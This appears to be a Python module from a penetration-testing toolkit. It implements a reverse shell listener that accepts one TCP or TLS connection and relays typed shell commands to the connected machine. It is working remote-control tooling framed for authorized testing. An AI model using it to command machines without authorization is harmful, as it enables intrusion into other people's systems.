"""Reverse Shell Listener — catch incoming connections for authorized pen tests."""

import socket
import select
import sys


def run_listener(args):
    """Entry point from CLI. Binds a TCP listener and handles one session."""
    host = args.host
    port = args.port
    use_tls = getattr(args, "type", "tcp") == "tls"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    sock.settimeout(1.0)

    proto = "TLS" if use_tls else "TCP"
    print(f"[*] Listening on {host}:{port} ({proto})")
    print("[*] Waiting for incoming connection... (Ctrl+C to stop)")

    try:
        while True:
            try:
                client, addr = sock.accept()
            except socket.timeout:
                continue

            if use_tls:
                import ssl

                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain("cert.pem", "key.pem")
                client = ctx.wrap_socket(client, server_side=True)

            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            _interactive_session(client)
            break
    except KeyboardInterrupt:
        print("\n[*] Listener stopped.")
    finally:
        sock.close()


def _interactive_session(client):
    """Simple interactive shell session with the connected client."""
    try:
        while True:
            cmd = input("shell> ")
            if cmd.lower() in ("exit", "quit"):
                client.send(b"exit\n")
                break
            if not cmd.strip():
                continue
            client.send((cmd + "\n").encode())
            # Wait for response with timeout
            ready, _, _ = select.select([client], [], [], 5)
            if ready:
                response = client.recv(65536).decode(errors="replace")
                print(response, end="")
            else:
                print("[!] No response (timeout)")
    except (ConnectionResetError, BrokenPipeError):
        print("[!] Connection lost.")
    finally:
        client.close()
